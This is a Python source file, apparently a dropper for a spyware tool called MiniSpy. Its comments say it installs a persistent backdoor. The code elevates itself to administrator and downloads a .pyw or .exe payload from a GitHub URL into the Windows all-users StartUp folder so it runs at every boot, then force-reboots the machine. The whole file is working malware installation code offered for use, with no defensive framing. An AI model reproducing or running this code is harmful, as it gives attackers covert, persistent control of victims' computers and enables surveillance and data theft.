# MiniSpy Installer

# Description:
# This is to install the payload to the startup files
# This will make a persistent backdoor so if they reboot the computer it will
# will start up on startup

# WARNING: THIS WILL ONLY DOWNLOAD THE PY FILE
# ------------------------------------------------------------------------------

# Import libraries
import requests  # For pulling the payload of my github repo
import os  # Reboot the computer
import ctypes  # For admin access
import sys  # For admin access

# Get important variables
target_path = 'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/'  # Python does not like forward slashes
payload_url = 'https://raw.githubusercontent.com/mastermind-0010/MiniSpy/main/MiniSpy_Payload.py'
payload_exe = 'https://github.com/mastermind-0010/MiniSpy/blob/main/MiniSpy_Payload.exe?raw=true'
exe = False  # IMPORTANT: Change this to True if you want the exe not the pyw


# -------------------------------------------------------------------------------
# IMPORTANT NOT MY CODE:
# This is from stack overflow by Martín De la Fuente
# https://stackoverflow.com/questions/130763/request-uac-elevation-from-within-a-python-script

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()

    except:
        return False


if is_admin():
    pass

else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()
# -------------------------------------------------------------------------------

if not exe:
    # Open the file
    payload = open(target_path + 'MiniSpy_Payload.pyw', 'w+')

    # Get the payload code from internet
    request = requests.get(payload_url)
    payload.write(request.text)

    # Close the file
    payload.close()

    # OPTIONAL: Reboot the computer
    os.system('shutdown /r /f')

if exe:
    # Open the file
    payload = open(target_path + 'MiniSpy_Payload.exe', 'wb')

    # Get the payload code from internet
    request = requests.get(payload_exe)
    payload.write(request.content)

    # Close the file
    payload.close()

    # OPTIONAL: Reboot the computer
    os.system('shutdown /r /f')
